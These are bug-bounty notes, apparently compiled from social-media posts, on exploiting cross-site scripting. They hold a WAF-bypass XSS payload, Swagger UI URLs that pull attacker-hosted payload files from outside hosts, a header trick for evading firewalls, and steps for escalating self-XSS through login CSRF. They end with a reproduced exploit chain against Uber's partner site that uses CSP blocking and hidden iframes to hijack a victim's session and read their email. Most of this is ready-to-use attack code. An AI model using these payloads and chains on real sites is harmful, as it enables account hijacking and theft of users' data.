


# XSS Cloudfare bypass
https://x.com/Jayesh25_/status/1720460725590663649?s=20
<Img Src=OnXSS OnError=confirm(1)>

# XSS in Swagger instance
https://x.com/Jayesh25_/status/1721623305575190893?s=20

If you come across an outdated Swagger instance, always remember to test for XSS vulnerabilities. Try these payloads and earn some quick bounties!

http://example(.)com/swagger-ui/index.html?configUrl=https://jumpy-floor.surge(.)sh/test.json

http://example(.)com/swagger-ui/index.html?url=https://jumpy-floor.surge(.)sh/test.yaml

http://example(.)com/swagger-ui/index.html?configUrl=https://xss.smarpo(.)com/test.json&url=https://jumpy-floor.surge(.)sh/test.yaml


if the  swagger instance is not vulnerable to XSS, go for the HTML Injection it will be accepted as P3/ P5 
Paylaod https://x.com/RootxRavi/status/1721625483014721756?s=20

# WAF bypass for Stored XSS

https://x.com/Jayesh25_/status/1719072435939459532?s=20
WAFs can pose significant challenges when hunting for Stored XSS vulnerabilities, but this simple trick can help you bypass them. By adding `'Content-Encoding: any_random_text'` to the request header, you can deceive some WAFs, allowing your payload to slip through undetected. Enjoy the hunt! 


# Self XSS

Assuming you've discovered a vulnerability like this, usually in profile pictures, addresses, or names, etc.

Here's how you can exploit these Issues:

1️⃣ First, ensure the target app's login functionality is vulnerable to CSRF. You can chain a Login CSRF to forcibly log a victim into your attacker account that houses the self-stored XSS payload. This transforms it into Stored XSS, letting you run malicious JS within the victim's session context.

2️⃣ Another trick up your sleeve: CSRF with a password reset. If the system auto-logs in after a successful password reset, you can forcibly log a victim into the attacker-controlled account to execute the self XSS payload.

3️⃣ Check for OAuth login endpoints that might be vulnerable to CSRF. Use them to forcefully log users into the attacker account for executing your malicious XSS payload.

4️⃣ Some sites use session tokens or other redirects to log in users, and these are often susceptible to CSRF. Chain them to exploit the SELF XSS by forcefully logging victims into your attacker-controlled account.

5️⃣ If none of the above works. Don't worry! We have more explicit tricks up our sleeves, which we'll tweet about soon!


# ALso
https://x.com/AyushSingh1098/status/1720746624488804581?s=20

You can also do this if the site allows you to iframe the website. In first iframe -> load the sensitive info of victim-> in 2nd iframe, log out the victim and log in to attacker's account -> since both iframes have same origin, our xss payload can read data from first iframe

https://whitton.io/articles/uber-turning-self-xss-into-good-xss/

# Amazing trick to stop redirect using CSP while doing CSRF in this artile

<!-- Set content security policy to block requests to login.uber.com, so the target maintains their session -->
<meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">
<!-- Logout of partners.uber.com -->
<img src="https://partners.uber.com/logout/" onerror="login();">
<script>
    //Initiate login so that we can redirect them
    var login = function() {
        var loginImg = document.createElement('img');
        loginImg.src = 'https://partners.uber.com/login/';
        loginImg.onerror = redir;
    }
    //Redirect them to login with our code
    var redir = function() {
        //Get the code from the URL to make it easy for testing
        var code = window.location.hash.slice(1);
        var loginImg2 = document.createElement('img');
        loginImg2.src = 'https://partners.uber.com/oauth/callback?code=' + code;
        loginImg2.onerror = function() {
            //Redirect to the profile page with the payload
            window.location = 'https://partners.uber.com/profile/';
        }
    }
</script>

//Create the iframe to log the user out of our account and back into theirs
var loginIframe = document.createElement('iframe');
loginIframe.setAttribute('src', 'https://fin1te.net/poc/uber/login-target.html');
document.body.appendChild(loginIframe);

The contents of the iframe uses the CSP trick again:

<!-- Set content security policy to block requests to login.uber.com, so the target maintains their session -->
<meta http-equiv="Content-Security-Policy" content="img-src partners.uber.com">
<!-- Log the user out of our partner account -->
<img src="https://partners.uber.com/logout/" onerror="redir();">
<script>
    //Log them into partners via their session on login.uber.com
    var redir = function() {
        window.location = 'https://partners.uber.com/login/';
    };
</script>

The final piece is to create another iframe, so we can grab some of their data.

//Wait a few seconds, then load the profile page, which is now *their* profile
setTimeout(function() {
    var profileIframe = document.createElement('iframe');
    profileIframe.setAttribute('src', 'https://partners.uber.com/profile/');
    profileIframe.setAttribute('id', 'pi');
    document.body.appendChild(profileIframe);
    //Extract their email as PoC
    profileIframe.onload = function() {
        var d = document.getElementById('pi').contentWindow.document.body.innerHTML;
        var matches = /value="([^"]+)" name="email"/.exec(d);
        alert(matches[1]);
    }
}, 9000);

After combining all the steps, we have the following attack flow:

    Add the payload from step 3 to our profile
    Login to our account, but cancel the callback and make note of the unused code parameter
    Get the user to visit the file we created from step 2 - this is similar to how you would execute a reflected-XSS against someone
    The user will then be logged out, and logged into our account
    The payload from step 3 will be executed
    In a hidden iframe, they’ll be logged out of our account
    In another hidden iframe, they’ll be logged into their account
    We now have an iframe, in the same origin containing the user’s session
